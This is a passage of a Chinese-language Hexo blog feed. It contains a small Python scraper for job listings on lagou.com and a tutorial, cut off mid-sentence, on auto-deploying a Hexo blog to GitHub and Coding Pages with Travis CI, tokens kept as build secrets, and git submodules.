class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    keyword = <span class="string">'逆向'</span></span><br><span class="line">    region = <span class="string">'全国'</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'application/json, text/javascript, */*; q=0.01'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, br'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line">        <span class="string">'Cache-Control'</span>: <span class="string">'no-cache'</span>,</span><br><span class="line">        <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line">        <span class="string">'Content-Length'</span>: <span class="string">'37'</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded; charset=UTF-8'</span>,</span><br><span class="line">        <span class="string">'Host'</span>: <span class="string">'www.lagou.com'</span>,</span><br><span class="line">        <span class="string">'Origin'</span>: <span class="string">'https://www.lagou.com'</span>,</span><br><span class="line">        <span class="string">'Pragma'</span>: <span class="string">'no-cache'</span>,</span><br><span class="line">        <span class="string">'Referer'</span>: <span class="string">'https://www.lagou.com/jobs/list_%s?city=%s'</span> % (urllib.parse.quote(keyword), urllib.parse.quote(region)),</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'X-Anit-Forge-Code'</span>: <span class="string">'0'</span>,</span><br><span class="line">        <span class="string">'X-Anit-Forge-Token'</span>: <span class="string">'None'</span>,</span><br><span class="line">        <span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'pn'</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">'kd'</span>: keyword,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    total_count = <span class="number">1</span></span><br><span class="line">    pn = <span class="number">1</span></span><br><span class="line">    jobjson = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> total_count &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data[<span class="string">'pn'</span>] = pn</span><br><span class="line">        lagou_reverse_search = requests.post(<span class="string">"https://www.lagou.com/jobs/positionAjax.json?needAddtionalResult=false"</span>, headers=headers, data=data)</span><br><span class="line">        datajson = json.loads(lagou_reverse_search.text)</span><br><span class="line">        print(<span class="string">'page %d get finish'</span> % pn)</span><br><span class="line">        <span class="keyword">if</span> pn == <span class="number">1</span>:</span><br><span class="line">            total_count = int(datajson[<span class="string">'content'</span>][<span class="string">'positionResult'</span>][<span class="string">'totalCount'</span>])</span><br><span class="line">        jobjson += [&#123;<span class="string">'positionName'</span>: j[<span class="string">'positionName'</span>], <span class="string">'salary'</span>: j[<span class="string">'salary'</span>], <span class="string">'workYear'</span>: j[<span class="string">'workYear'</span>], <span class="string">'education'</span>: j[<span class="string">'education'</span>], <span class="string">'city'</span>: j[<span class="string">'city'</span>], <span class="string">'industryField'</span>: j[<span class="string">'industryField'</span>], <span class="string">'companyShortName'</span>: j[<span class="string">'companyShortName'</span>], <span class="string">'financeStage'</span>: j[<span class="string">'financeStage'</span>]&#125; <span class="keyword">for</span> j <span class="keyword">in</span> datajson[<span class="string">'content'</span>][<span class="string">'positionResult'</span>][<span class="string">'result'</span>]]</span><br><span class="line">        total_count -= <span class="number">15</span></span><br><span class="line">        pn += <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">    csv_header = [<span class="string">'positionName'</span>, <span class="string">'salary'</span>, <span class="string">'workYear'</span>, <span class="string">'education'</span>, <span class="string">'city'</span>, <span class="string">'industryField'</span>, <span class="string">'companyShortName'</span>, <span class="string">'financeStage'</span>]</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'job.csv'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f_csv = csv.DictWriter(f, csv_header)</span><br><span class="line">        f_csv.writeheader()</span><br><span class="line">        f_csv.writerows(jobjson)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>ajax动态加载的，直接打开调试工具看XHR即可。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;花了十来分钟写了个这个小爬虫，目的就是想能够方便一点寻找职位，并且大四了，没有工作和实习很慌啊！&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="http://hacktech.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>GTD利器Google Calendar与Hexo博客的结合</title>
    <link href="http://hacktech.cn/2018/09/08/GTD-google-calendar-with-hexo-next.html"/>
    <id>http://hacktech.cn/2018/09/08/GTD-google-calendar-with-hexo-next.html</id>
    <published>2018-09-07T18:44:25.000Z</published>
    <updated>2019-05-23T06:42:08.035Z</updated>
    
    <content type="html"><![CDATA[<p>等待 <code>hexo-theme-next</code> 主题官方仓库的合并。以后再写，先挖个坑。<br><a id="more"></a><br>等待 <code>hexo-theme-next</code> 主题官方仓库的合并。以后再写，先挖个坑。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;等待 &lt;code&gt;hexo-theme-next&lt;/code&gt; 主题官方仓库的合并。以后再写，先挖个坑。&lt;br&gt;
    
    </summary>
    
      <category term="blog" scheme="http://hacktech.cn/categories/blog/"/>
    
    
      <category term="blog" scheme="http://hacktech.cn/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>使用Travis CI自动部署博客到github pages和coding pages</title>
    <link href="http://hacktech.cn/2018/09/07/use-travis-ci-update-hexo-to-github-and-coding.html"/>
    <id>http://hacktech.cn/2018/09/07/use-travis-ci-update-hexo-to-github-and-coding.html</id>
    <published>2018-09-07T11:25:20.000Z</published>
    <updated>2019-05-23T06:42:08.039Z</updated>
    
    <content type="html"><![CDATA[<p>每次换系统或换电脑之后重新部署博客总是很苦恼？想像jekyll那样，一次性部署完成后，以后本地不用安装环境直接 <code>git push</code> 就能生成博客？那我推荐你应该使用使用 <code>Travis CI</code>了。</p><p>这篇文章我们来讲讲如何利用 <code>Travis CI</code>把你 <code>push</code> 上去的博客源文件直接生成可访问的站点，并且同步部署到 <code>github pages</code> 和 <code>coding pages</code> 。</p><p>这篇文章假设你已经对这些采用 <code>git</code> 版本控制系统的静态博客托管服务有所了解，并且知道怎么去简单的使用 <code>git</code> 以及了解 <code>hexo</code> 写博客发布到这些 <code>pages</code> 服务的流程。因此本文会写的较为<strong>简略，旨在指出关键的地方以及我遇到的问题、问题产生的原因和提供的解决方案</strong>，希望能够帮助到大家。</p><a id="more"></a><p>如果大家有什么问题可以直接在下方评论（独立博客采用Disqus，可能需要翻墙），或者直接给我邮件（<a href="mailto:akkuamns@qq.com" target="_blank" rel="noopener">akkuamns@qq.com</a>），我可能会在以后的时间逐步把详细的流程写出来，时间不多，匆忙之际下笔，望大家见谅。</p><p>看完上面的话，是不是有一种“复恐匆匆说不尽，行人临发又开封。”的感觉，可能废话太多了，那么直接开始吧！</p><h2 id="令牌的获取"><a href="#令牌的获取" class="headerlink" title="令牌的获取"></a>令牌的获取</h2><h3 id="问个为什么"><a href="#问个为什么" class="headerlink" title="问个为什么"></a>问个为什么</h3><p>首先我们说一下为什么要获取令牌？他的作用是什么？</p><p>先给大家几个流程图，来自于<a href="https://liolok.github.io/Hexo-Travis-CI/" target="_blank" rel="noopener">liolok的博客(前两张)</a>和<a href="http://magicse7en.github.io/2016/03/27/travis-ci-auto-deploy-hexo-github/" target="_blank" rel="noopener">CodingLife的博客(第三张)</a></p><p>首先是当我们未采用 <code>Travis CI</code> ，直接使用 <code>hexo</code> 的插件 <code>hexo-deployer-git</code> 执行命令 <code>hexo d -g</code> 部署的流程：</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fv189l6c01j20xh0j9q4c.jpg" alt="liolok的博客-旧流程"></p><p>然后是使用 <code>Travis CI</code> 进行将仓库中的站点源文件自动生成站点然后部署到特定仓库(或特定分支)的流程：</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fv18c106iaj219a0k3q4s.jpg" alt="liolok的博客-新流程"></p><p>还有一张图大家也可以看看：</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fv18deh3foj20tx0sfafg.jpg" alt="TravisCI自动构建hexo博客流程图"></p><p>现在假设一种情况：我们把 <code>username/username.github.io</code> 仓库 <code>clone</code> 了下来，然后在它里面新建了一个分支 <code>hexo</code> 并放置我们的站点源文件（也就是你 <code>hexo init blog</code> 出来的 <code>blog</code> 目录下的所有文件），然后把这个 <code>hexo</code> 分支 <code>push</code> 了上去。</p><p>那么你设置这个仓库到 <code>Travis CI</code> 之后会做什么呢？它会寻找 <code>.travis.yml</code> 这个文件，如果存在的话，它就会根据 <code>.travis.yml</code> 来自动执行一些命令，这些命令就可以完成我们的需求。</p><p>然后我们回到刚才的话题，为什么要获取令牌？</p><p>令牌相当于一个通行证，比如要实现我们的需求，我们的 <code>.travis.yml</code> 中需要把 <code>hexo</code> 分支下的站点源文件文件使用 <code>hexo g</code> 生成静态站点后把这个静态站点 <code>push</code> 到我们的仓库，那 <code>github</code> 总不可能让人想 <code>push</code> 到谁的仓库就可以直接 <code>push</code> 上去吧，所以它就是靠这个通行证来验证你的身份。</p><p>所以我们把令牌的key字段加到 <code>Travis CI</code> 后就可以让 <code>github</code> 知道：哦，这个人是已授权的。</p><h3 id="那么怎么做"><a href="#那么怎么做" class="headerlink" title="那么怎么做"></a>那么怎么做</h3><p>那应该怎么去获取这个令牌并加到  <code>Travis CI</code> 呢？</p><p>哦哦，忘了说一个东西，如果你仔细看了我刚才的描述，那么你可能对这个  <code>Travis CI</code> 还是不了解，只是大致知道了他可以用来做什么，借用一下维基百科上的解释：</p><blockquote><p>Travis CI是在软件开发领域中的一个在线的，分布式的持续集成服务，用来构建及测试在GitHub托管的代码。</p></blockquote><p>你可以把它简单的认为是一个用来 <code>读取你的仓库 -&gt; 读取仓库下的 .travis.yml 文件 -&gt; 根据 .travis.yml 的内容对这个仓库来执行一系列linux和git命令去达到你的目的</code> 的工具。</p><p>那么谈到令牌的获取，这个并不麻烦。</p><p>如果是 <code>github</code>，登陆后打开设置，然后进入 <code>Developer settings -&gt;Personal access tokens</code> 点击 <code>Generate new token</code>，然后会提示你选择这个令牌拥有的权限，因为我们只需要对仓库进行操作，选中 <code>repo</code>即可。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fv193cmo02j20sy0g1q46.jpg" alt=""></p><p>然后复制那一串 <code>token</code> 先保存下来。</p><p>如果是 <code>coding</code>，打开 <code>个人设置 -&gt; 访问令牌</code>，然后点击 <code>新建令牌</code>，同样的给予仓库的控制权限，然后复制保存生成的 <code>token</code> 。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fv1978v3jhj20r80cj754.jpg" alt=""></p><p>然后打开<a href="https://travis-ci.org" target="_blank" rel="noopener">Travis CI</a> 网站，然后点击右上角的用github登录，然后同步你的仓库，再打开你需要自动部署的仓库开关，点击设置进去添加 <code>token</code> 即可。直接给两张图。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fv19ce3p5xj20up0ieq4h.jpg" alt=""></p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fv19fuupr5j21hc0u0ad1.jpg" alt=""></p><p>需要注意的是</p><ul><li>每个<code>Token</code> 自定义的 <code>Name</code> 你需要记住，待会在写 <code>.travis.yml</code> 的时候会用到</li><li><code>Display value in build log</code> 这个选项千万不要打开，因为log是公网可见的</li></ul><h2 id="仓库的结构"><a href="#仓库的结构" class="headerlink" title="仓库的结构"></a>仓库的结构</h2><p>上面完成了，我们来说说仓库的结构。</p><ol><li><p>你可以把站点源文件部署到一个新仓库（假如是 <code>new_repo</code>），那么你需要更改一下上面的设置，不是打开博客仓库的开关了，而是换成打开你需要操作的仓库 <code>new_repo</code>的开关，然后  <code>Travis CI</code> 再通过我们设置好的 <code>.travis.yml</code> 自动部署到博客仓库</p></li><li><p>你也可以把站点源文件部署到博客仓库（下文我以 <code>akkuman.github.io</code> 代替）的新分支，然后 <code>Travis CI</code> 再通过这个新分支下我们设置好的 <code>.travis.yml</code> 自动部署到博客仓库 <code>akkuman.github.io</code> 。</p></li></ol><p>这里我们采用第二种方案，只是个人爱好，不想再多开一个仓库。</p><h2 id="仓库的改造"><a href="#仓库的改造" class="headerlink" title="仓库的改造"></a>仓库的改造</h2><h3 id="新分支的建立"><a href="#新分支的建立" class="headerlink" title="新分支的建立"></a>新分支的建立</h3><p>直接看下面的命令和注释吧。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先把自己的博客仓库clone到本地</span></span><br><span class="line">git <span class="built_in">clone</span> git@github.com:akkuman/akkuman.github.io.git</span><br><span class="line"><span class="built_in">cd</span> akkuman.github.io.git</span><br><span class="line"><span class="comment"># 我们假设仓库下的部署分支是master</span></span><br><span class="line"><span class="comment"># 我们先新建并切换到一个新分支，分支名我这里取为hexo</span></span><br><span class="line">git checkout -b hexo</span><br></pre></td></tr></table></figure><p>现在我们已经切换到了新分支 <code>hexo</code>，紧接着我们删除 <code>akkuman.github.io</code> 文件夹下除了 <code>.git</code> 文件夹的其他所有文件。</p><p>我们把其他地方 <code>hexo init blog</code> 出来的 <code>blog</code> 站点文件夹下所有文件复制到刚才的 <code>akkuman.github.io</code> 文件夹下。</p><h3 id="站点主题的处理"><a href="#站点主题的处理" class="headerlink" title="站点主题的处理"></a>站点主题的处理</h3><p>这里我们需要注意:<br>不知道你的主题是怎么下载来的，我就分为 1.主题是一个 <code>git</code> 仓库 2.主题不是一个 <code>git</code> 仓库，所以主题可能也是一个 <code>git</code> 仓库，如果你对 <code>git</code> 不熟悉，建议不要 <code>git clone</code> 主题仓库，而是下载别人的 <code>release</code> 版。</p><p>判断一个文件夹是不是 <code>git</code> 仓库，就是看该文件夹目录下有没有一个 <code>.git</code>文件夹，注意它是一个隐藏文件夹，所以你发现你的主题是一个 <code>git</code> 仓库的时候，你可以删除这个隐藏的 <code>.git</code>文件夹。</p><p>那么我们这么做的目的是什么呢？</p><p>如果我们的主题文件夹也是一个 <code>git</code> 仓库，那么我们的这个博客仓库的 <code>hexo</code> 分支下就嵌套了一个仓库，当然，<code>git</code> 也给出了解决方案，那就是子模块。所以目的就是告诉你：图省事可以直接使用非 <code>git</code> 仓库的主题，不用折腾子模块。</p><p>多说一点吧：</p><p>说到子模块，子模块是SSH协议还是HTTPS协议对后面有影响，不过我后面会给一个通用的模板，看后面的注释即可。</p><p>这个子模块你是使用SSH协议还是HTTPS协议就看个人爱好了，我是自己 <code>fork</code> 了别人的仓库然后修改了一下，所以我为了方便期间还是使用了SSH协议的仓库。</p><p>然后子模块怎么使用呢？</p><p>比如我使用的主题仓库是<a href="mailto:`git@github.com" target="_blank" rel="noopener">`git@github.com</a>:akkuman/hexo-theme-next.git<code>，现在假设我们在博客仓库</code>akkuman.github.io<code>下，然后执行下面命令把这个主题仓库下的所有文件复制到站点目录下的</code>themes/next` 文件夹下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git submodule add git@github.com:akkuman/hexo-theme-next.git themes/next</span><br></pre></td></tr></table></figure><p>然后你的目录下会出现一个 <code>.gitmodules</code> 文件，内容格式大致是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[submodule &quot;themes/next&quot;]</span><br><span class="line">path = themes/next</span><br><span class="line">url = git@github.com:akkuman/hexo-theme-next.git</span><br></pre></td></tr></table></figure><p>关于子模块的知识可以自己查阅资料，我这里不细说了，待会在后面我会给出参考资料。</p><h3 id="git需要忽略的文件"><a href="#git需要忽略的文件" class="headerlink" title="git需要忽略的文件"></a>git需要忽略的文件</h3><p><code>git</code> 依靠 <code>.gitignore</code> 文件判断那些文件不纳入仓库，一般通过 <code>hexo init</code> 命令出来的站点文件夹下都会有这么个文件。没有也没关系，自己新建一个 <code>.gitignore</code> 文件，内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.log</span><br><span class="line">node_modules/</span><br><span class="line">public/</span><br><span class="line">.deploy*/</span><br></pre></td></tr></table></figure><blockquote><p>node_modules目录是hexo博客实例的npm环境依赖,，据说是质量比黑洞还大的物体， 我们选择忽略它， 反正最后到了Travis那里也会重新跑一遍npm install,，这些东西本来也会删了重来, 没有同步的意义.<br>public目录是hexo生成的静态文件， db.json是数据库文件,，同理,，由于Travis构建流程中会执行hexo clean,，都不需要同步。</p></blockquote><h3 id="travis-yml的设置"><a href="#travis-yml的设置" class="headerlink" title=".travis.yml的设置"></a>.travis.yml的设置</h3><p>上面的操作完成后，我们开始着手写 <code>.travis.yml</code>了，先提供一个最简单也是网上博客教程里面最多的版本</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">node_js</span> <span class="comment"># 设置语言</span></span><br><span class="line"><span class="attr">node_js:</span> <span class="string">stable</span> <span class="comment"># 设置相应版本</span></span><br><span class="line"><span class="attr">install:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">npm</span> <span class="string">install</span> <span class="comment"># 安装hexo及插件</span></span><br><span class="line"><span class="attr">script:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">hexo</span> <span class="string">clean</span> <span class="comment"># 清除</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">hexo</span> <span class="string">g</span> <span class="comment"># 生成</span></span><br><span class="line"><span class="attr">after_script:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">cd</span> <span class="string">./public</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">init</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">config</span> <span class="string">user.name</span> <span class="string">"yourname"</span> <span class="comment"># 修改name</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">config</span> <span class="string">user.email</span> <span class="string">"your email"</span> <span class="comment"># 修改email</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">add</span> <span class="string">.</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">commit</span> <span class="bullet">-m</span> <span class="string">"Travis CI Auto Builder"</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">push</span> <span class="bullet">--force</span> <span class="bullet">--quiet</span> <span class="string">"https://$&#123;GH_TOKEN&#125;@$&#123;GH_REF&#125;"</span> <span class="attr">master:master</span> <span class="comment"># GH_TOKEN是在Travis中配置token的名称</span></span><br><span class="line"><span class="attr">branches:</span></span><br><span class="line"><span class="attr">    only:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">hexo</span> <span class="comment">#只监测hexo分支，hexo是我的分支的名称，可根据自己情况设置</span></span><br><span class="line"><span class="attr">env:</span></span><br><span class="line"><span class="attr">    global:</span></span><br><span class="line"><span class="attr">        - GH_REF:</span> <span class="string">github.com/yourname/yourname.github.io.git</span> <span class="comment">#设置GH_REF，注意更改yourname</span></span><br></pre></td></tr></table></figure><p>这个是针对 <code>github</code> 仓库的最简版本，不过有个问题，我们从执行的命令中也能看到，就是部署到 <code>master</code> 分支的站点文件每次都会 <code>init</code> 后在提交，所以每次都只有一次 <code>commit</code> 记录，我建议你把下面的看完。</p><p>我先把文件给出来：</p><p><code>.travis.yml</code> 文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">node_js</span></span><br><span class="line"></span><br><span class="line"><span class="attr">node_js:</span> <span class="string">stable</span></span><br><span class="line"></span><br><span class="line"><span class="attr">cache:</span></span><br><span class="line"><span class="attr">    apt:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    directories:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">node_modules</span></span><br><span class="line"></span><br><span class="line"><span class="attr">notifications:</span></span><br><span class="line"><span class="attr">    email:</span></span><br><span class="line"><span class="attr">        recipients:</span></span><br><span class="line"><span class="bullet">            -</span> <span class="string">akkumans@qq.com</span></span><br><span class="line"><span class="attr">        on_success:</span> <span class="string">change</span></span><br><span class="line"><span class="attr">        on_failure:</span> <span class="string">always</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># turn off the clone of submodules for change the SSH to HTTPS in .gitmodules to avoid the error</span></span><br><span class="line"><span class="attr">git:</span></span><br><span class="line"><span class="attr">  submodules:</span> <span class="literal">false</span></span><br><span class="line">        </span><br><span class="line"><span class="attr">before_install:</span></span><br><span class="line">    <span class="comment"># Use sed to replace the SSH URL with the public URL if .gitmodules exists</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">test</span> <span class="bullet">-e</span> <span class="string">".gitmodules"</span> <span class="string">&amp;&amp;</span> <span class="string">sed</span> <span class="bullet">-i</span> <span class="string">'s/git@github.com:/https:\/\/github.com\//'</span> <span class="string">.gitmodules</span></span><br><span class="line">    <span class="comment"># update the submodule in repo by manual</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">submodule</span> <span class="string">update</span> <span class="bullet">--init</span> <span class="bullet">--recursive</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">export</span> <span class="string">TZ='Asia/Shanghai'</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">hexo-cli</span> <span class="bullet">-g</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">chmod</span> <span class="string">+x</span> <span class="string">./publish-to-gh-pages.sh</span></span><br><span class="line"></span><br><span class="line"><span class="attr">install:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">npm</span> <span class="string">install</span></span><br><span class="line"></span><br><span class="line"><span class="attr">script:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">hexo</span> <span class="string">clean</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">hexo</span> <span class="string">g</span></span><br><span class="line"></span><br><span class="line"><span class="attr">after_script:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">./publish-to-gh-pages.sh</span></span><br><span class="line"></span><br><span class="line"><span class="attr">branches:</span></span><br><span class="line"><span class="attr">    only:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">hexo</span></span><br><span class="line"></span><br><span class="line"><span class="attr">env:</span></span><br><span class="line"><span class="attr">    global:</span></span><br><span class="line">        <span class="comment"># Github Pages</span></span><br><span class="line"><span class="attr">        - GH_REF:</span> <span class="string">github.com/akkuman/akkuman.github.io.git</span></span><br><span class="line">        <span class="comment"># Coding Pages</span></span><br><span class="line"><span class="attr">        - CD_REF:</span> <span class="string">git.coding.net/Akkuman/Akkuman.git</span></span><br></pre></td></tr></table></figure><p>我把需要执行的脚本放到了 <code>publish-to-gh-pages.sh</code> 文件。</p><p><code>publish-to-gh-pages.sh</code> 文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="string">set</span> <span class="bullet">-ev</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get clone master</span></span><br><span class="line"><span class="string">git</span> <span class="string">clone</span> <span class="attr">https://$&#123;GH_REF&#125;</span> <span class="string">.deploy_git</span></span><br><span class="line"><span class="string">cd</span> <span class="string">.deploy_git</span></span><br><span class="line"><span class="string">git</span> <span class="string">checkout</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line"><span class="string">cd</span> <span class="string">../</span></span><br><span class="line"><span class="string">mv</span> <span class="string">.deploy_git/.git/</span> <span class="string">./public/</span></span><br><span class="line"></span><br><span class="line"><span class="string">cd</span> <span class="string">./public</span></span><br><span class="line"></span><br><span class="line"><span class="string">git</span> <span class="string">config</span> <span class="string">user.name</span> <span class="string">"Akkuman"</span></span><br><span class="line"><span class="string">git</span> <span class="string">config</span> <span class="string">user.email</span> <span class="string">"akkumans@qq.com"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add commit timestamp</span></span><br><span class="line"><span class="string">git</span> <span class="string">add</span> <span class="string">.</span></span><br><span class="line"><span class="string">git</span> <span class="string">commit</span> <span class="bullet">-m</span> <span class="string">"Travis CI Auto Builder at `date +"</span><span class="string">%Y-%m-%d</span> <span class="string">%H:%M"`"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Github Pages</span></span><br><span class="line"><span class="string">git</span> <span class="string">push</span> <span class="bullet">--force</span> <span class="bullet">--quiet</span> <span class="string">"https://$&#123;GITHUB_TOKEN&#125;@$&#123;GH_REF&#125;"</span> <span class="attr">master:master</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Coding Pages</span></span><br><span class="line"><span class="string">git</span> <span class="string">push</span> <span class="bullet">--force</span> <span class="bullet">--quiet</span> <span class="string">"https://Akkuman:$&#123;CODING_TOKEN&#125;@$&#123;CD_REF&#125;"</span> <span class="attr">master:master</span></span><br></pre></td></tr></table></figure><p>请把对应的 <code>Akkuman</code> 和 <code>email</code> 还有 <code>username</code> 改成你的配置。</p><p>这里我不详解配置，因为这篇文章已经花了很长时间了，如果大家有需要我再详细写。下面我会给出我的仓库地址，如果有不懂可以去看看我仓库下的例子。</p><p>说着不详解，但是我还是有点自己踩过的坑需要提点一下，<code>Travis CI</code> 进行 <code>git clone</code> 操作的时候，默认是开启 <code>--recursive</code> 参数的，也就是克隆库的时候会默认初始化子模块。这个操作本来是没问题的，那么我为什么要单独提出来说？</p><p>我上面说到了：</p><blockquote><p>说到子模块，子模块是SSH协议还是HTTPS协议对后面有影响</p></blockquote><p>问题就是这里了，如果你是用的HTTPS协议，根据 <code>.gitmodules</code> 文件默认初始化子模块的时候是没问题。但是如果使用SSH协议，不管是 <code>clone</code>、<code>push</code>还是其他等等操作， 是要求本机上有私钥，并且仓库那边要有对应的公钥才可以。但是<code>Travis CI</code> 自动部署执行 